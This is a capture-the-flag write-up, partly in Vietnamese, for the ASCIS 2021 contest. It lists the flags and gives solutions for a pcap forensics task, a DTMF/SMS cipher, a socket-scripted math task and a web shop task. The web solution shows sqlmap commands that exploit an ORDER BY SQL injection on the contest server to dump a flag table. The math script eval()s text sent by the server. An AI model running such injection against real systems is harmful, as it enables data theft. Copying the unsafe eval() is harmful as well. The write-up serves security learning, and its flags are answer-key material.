# ASEAN STUDENT CONTEST ON INFORMATION SECURITY 2021

### Overview
 | Title | Category | Points | Flag
 | ------ | ------ | ------ | ------ |
 | [Hitech Shop](#Hitech-Shop) | Web | 100 | `ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY}` |
 | yeuvcs | Web | 200 |  |
 | [CALL ME MAYBE](#CALL-ME-MAYBE) | Crypto | 100 | `FLAG{SMS AND DMTF}` |
 | AES ECB crypto challenge | Crypto | 200 |  |
 | echo server | Pwnable | 100 |  |
 | Guessme | Pwnable | 200 |  |
 | Keygen me | Reverse | 100 |  |
 | Decrypt me | Reverse | 200 |  |
 | [Simple For](#Simple-For) | Misc | 100 | `ASCIS{n3tw0rk_f0r3ns1c_1s_n0t_h4rd}` |
 | [Calculate me](#Calculate-me) | Misc | 100 | `ASCIS{3v3ry0n3_sh0uld_kn0w_pr0gramm1ng}` |
 
# Simple For
 
### Challenge
 
<img src=files/185903.png>
 
[capture.pcap](files/capture.pcap)
 
### Solution

<img src=files/191647.png>

Follow TCP Stream

<img src=files/191756.png>

# Calculate me
 
### Challenge
 
<img src=files/192446.png>
 
### Solution

Dùng netcat truy cập ta nhận được như sau. (timeout là 5s)

<img src=files/192943.png>

Viết chương trình socket giao tiếp với server.

```python
# !/usr/bin/python
import socket

def receive_one_line(s):
    r = b''

    # Lần lượt nhận từng ký tự, nếu là ký tự xuống dòng thì ngưng
    while (True):
        t = s.recv(1)
        if t == b'\n': break
        r = r + t

    # Trả về kết quả dạng string
    return r.decode()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('125.235.240.166',20103))

data = receive_one_line(s)
print(data)
data = receive_one_line(s)
print(data)
while True:
    data = receive_one_line(s)
    print(data)

    str = int(eval(data[:data.find('=')]))
    print(str)

    s.sendall(f"{str}\n".encode())

    data = receive_one_line(s)
    print(data)
    data = receive_one_line(s)
    print(data)
```

Kết quả ta lấy được cờ.

<img src=files/193213.png>

# Simple For

### Challenge

<img src=files/193838.png>

### Solution

DTMF Code

<img src=files/194556.png>

Phone (SMS)

<img src=files/194643.png>

Cipher.txt > [DTMF Code](https://www.dcode.fr/dtmf-code) > 777767777026630368333 > [Multi-tap Phone (SMS)](https://www.dcode.fr/multitap-abc-cipher) > SMS AND DMTF

# Hitech Shop

### Challenge

<img src=files/195002.png>

### Solution

Fuz thử với dấu `'` ta không thấy display ra lỗi. Vậy guess là web server sử dụng hàm set_error_handler để catch lỗi.

<img src=files/195305.png>

Dùng sqlmap để exploit.

```
# sqlmap -u "http://125.235.240.166:20105/index?order=name" --dbs                  
...
available databases [2]:
[*] information_schema
[*] vannd
...
# sqlmap -u "http://125.235.240.166:20105/index?order=name" -D vannd --tables      
...
Database: vannd
[2 tables]
+----------+
| flag     |
| products |
+----------+
...
# sqlmap -u "http://125.235.240.166:20105/index?order=name" -D vannd -T flag --dump
Database: vannd
Table: flag
[1 entry]
+---------------------------------------+
| secret                                |
+---------------------------------------+
| ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY} |
+---------------------------------------+
...
```

